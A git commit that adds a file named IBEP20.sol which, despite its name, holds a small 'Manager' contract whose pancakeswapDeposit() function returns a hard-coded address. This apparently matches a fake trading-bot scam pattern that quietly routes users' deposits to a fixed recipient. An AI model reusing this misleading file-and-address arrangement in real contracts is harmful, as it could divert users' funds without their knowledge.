d9fd5637551792698c73f60bbb38afd48a36a974
PancakeSwapSolidity <97768009+pancakeSwapSOL@users.noreply.github.com>
2022-01-14 18:37:28 -0500

    Add files via upload

---
+++ IBEP20.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+	function factory() public pure {
+	}
+
+	function pancakeswapDeposit() public pure returns (address) {
+		return 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;
+	}
+	
+}
